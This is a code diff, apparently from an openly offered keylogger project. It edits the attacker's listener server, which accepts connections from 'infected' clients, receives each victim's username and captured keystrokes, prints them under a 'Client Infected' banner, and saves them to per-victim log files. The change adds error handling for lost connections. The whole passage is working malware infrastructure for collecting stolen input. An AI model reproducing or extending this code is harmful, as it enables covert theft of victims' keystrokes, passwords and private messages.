@@ -133,21 +133,24 @@ Keylogger(INTERVAL).run()
         s.listen(1)
 
     def listener(self):
-        client, ip = s.accept()
-        username = client.recv(500)
-        print(f" [{Fore.RED}WARN{Fore.RESET}] Client Infected", username.decode('utf-8'))
-        print(f" [{Fore.GREEN}SAVE{Fore.RESET}] Save File => logs\\logs_{username.decode('utf-8')}.txt")
-        while True:
-            date_write = strftime('%X %x')
-            date = strftime('%X')
-            requete_client = client.recv(500)
-            requete_client = requete_client.decode('utf-8')
-            with io.open(f"logs\\logs_{username.decode('utf-8')}.txt", "a", encoding="utf-8")as f:
-                f.write((f"[{str(date_write)}] => {requete_client}\n"))
-            print(f"""            
- [{Fore.CYAN}LOGS{Fore.RESET}][{str(date)}][{Fore.CYAN}{username.decode('utf-8')}{Fore.RESET}]
- ――――――――――――――――――――――――――――――――――
- {requete_client}""")
+        try:
+            client, ip = s.accept()
+            username = client.recv(500)
+            print(f" [{Fore.RED}WARN{Fore.RESET}] Client Infected", username.decode('utf-8'))
+            print(f" [{Fore.GREEN}SAVE{Fore.RESET}] Save File => logs\\logs_{username.decode('utf-8')}.txt")
+            while True:
+                date_write = strftime('%X %x')
+                date = strftime('%X')
+                requete_client = client.recv(500)
+                requete_client = requete_client.decode('utf-8')
+                with io.open(f"logs\\logs_{username.decode('utf-8')}.txt", "a", encoding="utf-8")as f:
+                    f.write((f"[{str(date_write)}] => {requete_client}\n"))
+                print(f"""            
+[{Fore.CYAN}LOGS{Fore.RESET}][{str(date)}][{Fore.CYAN}{username.decode('utf-8')}{Fore.RESET}]
+――――――――――――――――――――――――――――――――――
+{requete_client}""")
+        except Exception:
+            print(f" [{Fore.RED}WARN{Fore.RESET}] Connection lost with", username.decode('utf-8'))
 
 server = socks()
 server.choice()
